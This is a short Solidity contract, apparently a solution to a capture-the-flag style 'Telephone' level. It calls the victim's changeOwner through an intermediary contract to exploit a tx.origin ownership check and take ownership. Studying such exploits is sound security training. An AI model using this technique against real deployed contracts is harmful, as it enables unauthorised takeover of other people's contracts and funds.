// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Telephone.sol';

contract TelephoneAttack {  
    Telephone immutable victim;

    constructor(Telephone _victim) {
        victim = _victim;
    }

    function attack() external {
        victim.changeOwner(msg.sender);
    }
}